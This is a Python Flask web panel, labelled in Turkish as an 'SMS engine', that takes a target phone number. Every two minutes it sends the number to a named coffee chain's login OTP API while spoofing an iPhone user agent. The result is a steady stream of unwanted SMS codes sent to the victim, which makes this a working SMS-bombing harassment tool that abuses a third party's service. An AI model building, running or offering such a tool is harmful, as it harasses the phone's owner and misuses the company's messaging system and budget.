import os
import requests
import time
from flask import Flask, render_template_string, request
from flask_apscheduler import APScheduler

app = Flask(__name__)

# --- APSCHEDULER AYARI ---
class Config:
    SCHEDULER_API_ENABLED = True

app.config.from_object(Config())
scheduler = APScheduler()
scheduler.init_app(app)
scheduler.start()

# Değişkenleri hafızada tutuyoruz (Uygulama restart yiyene kadar kalır)
sys_data = {
    "target": "",
    "is_active": False,
    "logs": []
}

def write_log(message):
    now = time.strftime('%H:%M:%S')
    full_msg = f"[{now}] {message}"
    sys_data["logs"].append(full_msg)
    if len(sys_data["logs"]) > 12: sys_data["logs"].pop(0)
    # RENDER PANELE ANINDA DÖKMEK İÇİN:
    print(f">>> {full_msg}", flush=True)

# 2 DAKİKADA BİR ÇALIŞACAK GÖREV
@scheduler.task('interval', id='do_job', minutes=2)
def auto_worker():
    if not sys_data["is_active"] or not sys_data["target"]:
        return

    url = "https://api.kahvedunyasi.com/v1/login/otp"
    payload = {"mobile_number": sys_data["target"], "channel": "sms"}
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (iPhone; CPU OS 17_0 like Mac OS X)"}

    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        status = "BAŞARILI (200)" if r.status_code == 200 else f"HATA ({r.status_code})"
        write_log(f"{sys_data['target']} -> {status}")
    except:
        write_log("BAĞLANTI KESİLDİ")

@app.route('/')
def ui():
    # Sade ve Karanlık Tasarım
    html = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8"><title>SMS Panel</title>
        <style>
            body { background: #0a0a0a; color: #eee; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
            .box { background: #1a1a1a; padding: 25px; border-radius: 12px; width: 320px; border: 1px solid #333; text-align: center; }
            input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #444; color: #0f0; border-radius: 5px; box-sizing: border-box; }
            button { width: 48%; padding: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
            .start { background: #28a745; color: #fff; }
            .stop { background: #dc3545; color: #fff; }
            .logs { background: #000; color: #0f0; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 11px; height: 160px; overflow-y: auto; margin-top: 15px; text-align: left; }
        </style>
        <script>setTimeout(() => location.reload(), 15000);</script>
    </head>
    <body>
        <div class="box">
            <h3>SMS MOTORU v4</h3>
            <p style="color: {{ 'lime' if data.is_active else 'red' }}">Sistem: {{ 'ÇALIŞIYOR' if data.is_active else 'DURDU' }}</p>
            <form action="/set" method="post">
                <input type="text" name="num" placeholder="5XXXXXXXXX" value="{{ data.target }}">
                <button name="op" value="on" class="start">BAŞLAT</button>
                <button name="op" value="off" class="stop">DURDUR</button>
            </form>
            <div class="logs">
                {% for l in logs %}> {{ l }}<br>{% endfor %}
            </div>
        </div>
    </body>
    </html>
    """
    return render_template_string(html, data=sys_data, logs=reversed(sys_data["logs"]))

@app.route('/set', methods=['POST'])
def set_data():
    sys_data["target"] = request.form.get('num', '')
    sys_data["is_active"] = (request.form.get('op') == 'on')
    write_log(f"Sistem Güncellendi. Hedef: {sys_data['target']}")
    return jsonify({"ok": True}), 302, {'Location': '/'}

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
